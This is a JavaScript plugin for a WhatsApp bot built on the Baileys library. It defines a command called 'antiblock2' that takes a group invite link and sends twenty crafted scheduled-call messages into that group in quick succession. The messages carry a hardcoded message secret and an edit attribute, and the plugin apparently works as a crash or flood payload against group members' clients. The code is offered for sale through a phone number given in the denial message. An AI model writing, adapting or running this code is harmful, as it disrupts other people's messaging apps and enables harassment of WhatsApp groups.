import { getGroupInviteInfo } from '@whiskeysockets/baileys'; // si tu entorno lo necesita explícito

let handler = async (m, { conn, args, isBot, isOwner, command }) => {
  if (!isBot && !isOwner) {
    return conn.sendMessage(m.chat, {
      text: `\n ❌ *COMANDO NEGADO, SOLO PUEDE SER USADO POR MI PORTADOR. SI DESEAS ADQUIRIRLO MANDA MENSAJE A: +526421147692*\n`
    }, { quoted: m });
  }

  const link = args[0];
  if (!link || !link.includes('chat.whatsapp.com/')) {
    return m.reply('📎 *Debes proporcionar un enlace de grupo válido.*\n\nEjemplo: *.antiblock2 https://chat.whatsapp.com/xxxxxxxxxxxx*');
  }

  const code = link.split('/').pop().trim();
  let groupInfo;
  try {
    groupInfo = await conn.groupGetInviteInfo(code);
  } catch (e) {
    return m.reply('❌ *El enlace no es válido o ya expiró.*');
  }

  const groupJid = groupInfo.id;
  const cantidad = 20;

  for (let i = 0; i < cantidad; i++) {
    try {
      await conn.relayMessage(groupJid, {
        messageContextInfo: {
          messageSecret: "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
          deviceListMetaData: {},
          deviceListMetadataVersion: 2
        },
        scheduledCallCreationMessage: {
          scheduledTimestampMs: '1200',
          callType: "AUDIO",
          title: link,
        }
      }, {
        additionalAttributes: { edit: '7' }
      });

      await delay(100);
    } catch (e) {
      console.error(`[ERROR] Falló al enviar al grupo:`, e);
    }
  }

  await m.reply('✅ *Comando ejecutado con éxito en el grupo.*');
};

handler.command = ['antiblock2'];
handler.owner = false;
handler.bot = true;

export default handler;

// Función de espera
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}